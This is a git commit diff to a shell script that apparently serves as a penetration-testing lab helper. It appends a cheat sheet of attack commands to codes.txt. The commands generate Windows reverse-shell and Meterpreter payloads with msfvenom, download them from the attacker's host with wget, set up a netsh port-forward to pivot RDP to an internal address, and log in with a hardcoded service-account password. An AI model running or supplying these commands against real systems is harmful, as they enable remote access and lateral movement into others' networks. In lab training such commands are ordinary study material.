d0c7b27113c8fffd5f1d8e8ea83a7474a36ec8b0
yen5004 <119946331+yen5004@users.noreply.github.com>
2024-10-18 08:42:12 -0400

    Update starting_scripts.sh

--- starting_scripts.sh
+++ starting_scripts.sh
@@ -14,4 +14,11 @@ if [[ -z "$attkIP" || -z "$vicIP" ]]; then
 fi
 
 # Continue with your script here...
-
+sudo touch codes.txt
+echo "msfvenom -p windows/x64/shell/reverse_tcp LHOST=$1 LPORT=4444 -f exe -o 1franco.exe" >> codes.txt
+echo "msfvenom -p  windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -f exe -o 1franco_hacker.exe" >> codes.txt
+echo "wget "http://$1:8888/1franco_hacker.exe" -OutFile ".\1franco_hacker.exe"" >> codes.txt
+echo "wget "http://$1:8888/1franco.exe" -OutFile ".\1franco.exe"" >> codes.txt
+echo "netsh interface portproxy add v4tov4 listenport=1515 listenaddress=$2 connectport=3389 connectaddress=172.16.6.50'" >> codes.txt
+echo "xfreerdp /u:svc_sql /p:lucky7 /v:$1:1515" >> codes.txt
+echo "EOF"  >> codes.txt
